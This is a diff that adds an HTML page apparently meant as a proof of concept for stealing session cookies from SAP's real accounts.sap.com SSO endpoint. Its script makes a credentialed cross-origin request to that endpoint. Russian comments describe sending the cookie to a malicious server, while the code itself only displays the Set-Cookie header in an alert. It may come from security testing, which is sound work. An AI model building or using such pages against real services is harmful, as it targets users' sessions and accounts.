@@ -1,2 +1,27 @@
 
-https://accounts.sap.com/saml2/idp/sso?sp=sp.accounts.sap.com&RelayState=https://accounts.sap.com/ui/protected/profilemanagement
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto POST Request with Payload</title>
+</head>
+<body>
+<!-- <iframe src="https://help.sap.com/webassistant/context?id=32497794" width="500" height="500"></iframe> -->
+  
+  <script>
+    var xhr = new XMLHttpRequest();
+
+    // Отправка GET-запроса на сервер, пытаясь получить cookie
+    xhr.open("GET", "https://accounts.sap.com/saml2/idp/sso?sp=sp.accounts.sap.com&RelayState=https://accounts.sap.com/ui/protected/profilemanagement", true);
+    xhr.withCredentials = true; // Разрешить отправку cookie
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            // Успешный ответ от сервера, отправить cookie на злоумышленный сервер
+            var stolenCookie = xhr.getResponseHeader("Set-Cookie");
+            alert(stolenCookie);
+        }
+    };
+    xhr.send();
+      
+  </script>
+</body>
+</html>
